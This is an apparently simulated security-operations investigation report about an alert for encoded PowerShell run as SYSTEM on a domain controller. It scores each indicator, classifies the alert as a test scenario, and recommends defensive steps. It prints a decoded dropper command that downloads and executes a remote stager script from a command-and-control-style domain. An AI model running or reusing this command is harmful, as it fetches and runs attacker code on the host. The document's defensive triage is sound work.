@@ -1,0 +1,87 @@
+## Investigation Summary
+
+### Alert Classification and Severity Assessment
+- **Alert Type:** High severity PowerShell-based defense evasion attack
+- **Risk Score:** 87/100
+- **MITRE ATT&CK Techniques:** T1059.001 (PowerShell), T1027 (Obfuscated Files)
+- **Target:** Domain Controller (DC01.corp.widgets-inc.com)
+
+### Decoded PowerShell Command Analysis
+The base64 encoded command decodes to:
+```powershell
+IEX (New-Object Net.WebClient).DownloadString('https://c2-relay.darkops.net/stager.ps1')
+```
+This is a classic malware dropper pattern attempting to download and execute a remote PowerShell script.
+
+### Indicators of Compromise and Enrichment Results
+
+#### 1. **IP Address: 198.51.100.99**
+- **Risk Level:** LOW (False Positive)
+- **VirusTotal:** 0/94 engines flagged as malicious, marked as "harmless"
+- **AbuseIPDB:** Confidence score 0%, marked as reserved/test IP
+- **Analysis:** This is a TEST-NET-1 reserved IP address (RFC 5737) used for documentation and testing. It should never appear in live network traffic, indicating this is likely a simulated/test alert.
+
+#### 2. **Domain: c2-relay.darkops.net**
+- **Risk Level:** MEDIUM-HIGH (Suspicious)
+- **VirusTotal:** 0/94 engines flagged, but tagged as "dga" (Domain Generation Algorithm)
+- **Registration:** Created 2013-11-28, expires 2024-11-28 (expired)
+- **WHOIS:** Privacy-protected registration with masked details
+- **Analysis:** Suspicious domain name suggesting command-and-control infrastructure. The "darkops" name and DGA tag are concerning indicators.
+
+#### 3. **URL: https://c2-relay.darkops.net/stager.ps1**
+- **Risk Level:** HIGH (Malicious Intent)
+- **VirusTotal:** URL not found in database (404 error)
+- **Analysis:** Classic malware stager URL pattern. The "/stager.ps1" path is commonly used by malware frameworks like Cobalt Strike, Empire, or Metasploit.
+
+#### 4. **File Hash: de96a6e69944335375dc1ac238336066889d9ffc7d73628ef4fe1b1b160ab32c**
+- **Risk Level:** LOW (Legitimate)
+- **VirusTotal:** 0/75 engines flagged as malicious, reputation score 73
+- **Analysis:** This is the legitimate Microsoft PowerShell.exe binary (Windows Server 2019, version 10.0.17763.1). Digitally signed by Microsoft and distributed through official channels.
+
+#### 5. **Host Information**
+- **Affected System:** DC01 (Domain Controller)
+- **Internal IP:** 10.0.1.10
+- **User Context:** NT AUTHORITY\SYSTEM
+- **Analysis:** High-value target (domain controller) with privileged execution context.
+
+### Risk Assessment Summary
+
+**Individual Indicator Risks:**
+- **198.51.100.99:** LOW - Test/reserved IP
+- **c2-relay.darkops.net:** MEDIUM-HIGH - Suspicious C2-like domain
+- **stager.ps1 URL:** HIGH - Malware dropper pattern
+- **PowerShell hash:** LOW - Legitimate Microsoft binary
+- **Execution context:** HIGH - SYSTEM on domain controller
+
+### Overall Verdict: **FALSE POSITIVE / TEST SCENARIO**
+
+**Reasoning:**
+1. The destination IP (198.51.100.99) is a reserved test IP that should never appear in production traffic
+2. While the domain and URL patterns are highly suspicious and match real attack techniques, the use of a test IP suggests this is a simulated attack or security exercise
+3. The PowerShell binary itself is legitimate and properly signed by Microsoft
+
+### Recommended Next Steps
+
+1. **Immediate Actions:**
+   - Verify this is a planned security exercise or penetration test
+   - If not planned, treat as a potential live attack despite the test IP
+   - Check network logs for any actual outbound connections to the suspicious domain
+
+2. **Investigation Steps:**
+   - Interview system administrators about planned security testing
+   - Review security awareness training schedules
+   - Examine process tree and parent processes for additional context
+   - Check for persistence mechanisms on DC01
+
+3. **Preventive Measures:**
+   - Implement PowerShell logging and monitoring
+   - Consider PowerShell execution policy restrictions
+   - Block suspicious domains at DNS/proxy level
+   - Monitor for encoded PowerShell commands
+
+4. **Follow-up:**
+   - If confirmed as a test, document the exercise and update detection rules
+   - If real attack, initiate full incident response procedures
+   - Review domain controller security hardening
+
+**Note:** The combination of sophisticated attack techniques with a test IP address strongly suggests this is a controlled security exercise rather than a genuine threat.
